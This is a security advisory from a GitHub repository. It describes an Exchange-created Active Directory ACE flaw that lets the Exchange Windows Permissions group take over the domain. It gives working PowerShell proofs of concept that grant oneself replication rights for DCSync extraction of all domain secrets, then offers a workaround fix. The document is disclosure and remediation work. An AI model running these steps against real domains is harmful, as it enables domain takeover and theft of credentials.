Exchange-AD-Privesc/DomainObject.md at master · gdedrouas/Exchange-AD-Privesc · GitHub

## [![](data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' class='octicon octicon-link js-evernote-checked' viewBox='0 0 16 16' version='1.1' width='16' height='16' aria-hidden='true' data-evernote-id='32'%3e%3cpath fill-rule='evenodd' d='M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z' data-evernote-id='546' class='js-evernote-checked'%3e%3c/path%3e%3c/svg%3e)](https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md#domain-object-dacl-privilege-escalation)Domain object DACL privilege escalation

A privilege escalation is possible from the **Exchange Windows permissions** (EWP) security group to compromise the entire prepared Active Directory domain.

DISCLAIMER: This issue has been responsibly disclosed to MSRC in October 2017 and after a few back and forth emails, they decided it was working as intended and would not fix it.

- Description of the issue

When preparing Exchange 2010/2013/2016 installation in Shared permissions (default) or RBAC split permissions, some ACEs are positioned on the domain object for the **Exchange Windows Permissions** security group. This happens during the "Setup /PrepareAD" command.

Two ACEs on the domain object are missing the INHERIT_ONLY_ACE bit in the Flags field.

This is their SDDL representation:

	(OA;CI;DTWD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;<SID of EWP>)
	(OA;CI;DTWD;;bf967aba-0de6-11d0-a285-00aa003049e2;<SID of EWP>)

Notice the missing 'IO' (inherit_only) flag. As a matter of fact, INHERITED_OBJECT_TYPE ACE effectively apply to the object itself when the inherit_only flag is not set.

This is how they are documented on Technet, so it is definitely missing that information:

| Account | ACE type | Inheritance | Permissions | On property/ Applies to | Comments |
| --- | --- | --- | --- | --- | --- |
| Exchange Windows Permissions | Allow ACE | All | WriteDACL | / user |     |
| Exchange Windows Permissions | Allow ACE | All | WriteDACL | / inetOrgPerson |     |

This is how they appear in the GUI (DSA console), which is also missing that information:

[![DSA_ACE_view.png](../_resources/4dac511100322d2804916fe7bf1c3f2a.png)](https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DSA_ACE_view.png)

The issue can be confirmed in the "Effective Access" tab of the domain object when specifying EWP.

[![DSA_effective_access.png](../_resources/f0116df8b7e5e6160d806c63c4f7d655.png)](https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DSA_effective_access.png)

Coincidentally, INHERITED_OBJECT_TYPE ACE created with DSA console always have the IO flag. Creating a 'self and specific descendents', INHERITED_OBJECT_TYPE ACE is only possible programmatically and only viewable programmatically.

- Technical consequence

The Allow permission to WriteDACL is granted to the Trustee on the domain object itself and not only on its user/inetOrgPerson descendants, effectively giving complete control to anyone with the **Exchange Windows Permissions** SID in its token.

- Expected behavior

The Allow permission to WriteDACL should only be given on child objects matching the INHERITED_OBJECT_TYPE Guid. It is supposed to only apply to user or inetOrgPerson classes. This is not consistent with the other INHERITED_OBJECT_TYPE ACEs on the domain object for the same Trustee, which all have the INHERIT_ONLY_ACE bit in the Flags field.

- Security Consequence

A privilege escalation is possible from the **Exchange Windows permissions** (EWP) security group to compromise the entire prepared Active Directory domain. Just set the Ds-Replication-Get-Changes and Ds-Replication-Get-Changes-All extended rights on the domain object. This is enough to use a DRSUAPI replication tool ala DCSync to get all the domain secrets (Kerberos keys, hashes, etc.).

You can control the SID of the EWP group from **Organization management**, from **Account operators** or from any Exchange server. Interestingly, the RBAC system is proxified through EWP so a privilege escalation is possible from the *Active Directory Permissions* RBAC role to compromise the entire prepared Active Directory domain.

- Proof of concept 1: Set-Acl (or with DSA console)

From an **Organization Management** member account, add yourself to **Exchange Windows Permissions**. This is possible by default (see the above technet page).

	$id = [Security.Principal.WindowsIdentity]::GetCurrent()
	$user = Get-ADUser -Identity $id.User
	Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members $user

RELOG to update groups in your token then give yourself Ds-Replication-Get-Changes and Ds-Replication-Get-Changes-All extended rights on the domain object.

	$acl = get-acl "ad:DC=test,DC=local"
	$id = [Security.Principal.WindowsIdentity]::GetCurrent()
	$user = Get-ADUser -Identity $id.User
	$sid = new-object System.Security.Principal.SecurityIdentifier $user.SID
	# rightsGuid for the extended right Ds-Replication-Get-Changes-All
	$objectguid = new-object Guid  1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
	$identity = [System.Security.Principal.IdentityReference] $sid
	$adRights = [System.DirectoryServices.ActiveDirectoryRights] "ExtendedRight"
	$type = [System.Security.AccessControl.AccessControlType] "Allow"
	$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "None"
	$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
	$acl.AddAccessRule($ace)
	# rightsGuid for the extended right Ds-Replication-Get-Changes
	$objectguid = new-object Guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
	$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule $identity,$adRights,$type,$objectGuid,$inheritanceType
	$acl.AddAccessRule($ace)
	Set-acl -aclobject $acl "ad:DC=test,DC=local"

Optionally, if PowerView is available, the same can be achieved with its `Add-DomainObjectAcl` cmdlet using the flag `-Rights DCSync`.

- Proof of concept 2: RBAC Add-ADPermission

The following Powershell code, executed by a user account with the RBAC role *Active Directory Permissions*, sets the Ds-Replication-Get-Changes and Ds-Replication-Get-Changes-All extended rights on the domain object.

	$id = [Security.Principal.WindowsIdentity]::GetCurrent()
	Add-ADPermission "DC=test,DC=local" -User $id.Name -ExtendedRights Ds-Replication-Get-Changes,Ds-Replication-Get-Changes-All

- Workaround fix

Use the Fix-DomainObjectDACL.ps1 Powershell script in this repository. Read it, test it, use it at your own risk.

By default, it checks the two faulty ACE, this can be done by any user. Use with -Fix switch with Domain Admins privileges to set the InheritOnly missing flags. Use with -Restore switch to restore the two previously fixed ACEs to their original, *vulnerable* state. An SDDL backup is made everytime the script is run.

Another option is doing it manually with LDP. Bind as a Domain Admin account with the usual precautions, as you will change the domain object DACL. Locate the 2 faulty ACE in the DACL of the domain object: you can sort by Trustee to see Exchange Windows Permissions, there will only be 2 ACE with "Write DACL,..." Rights. Check the 'Inherit only' box in their ACE flags field.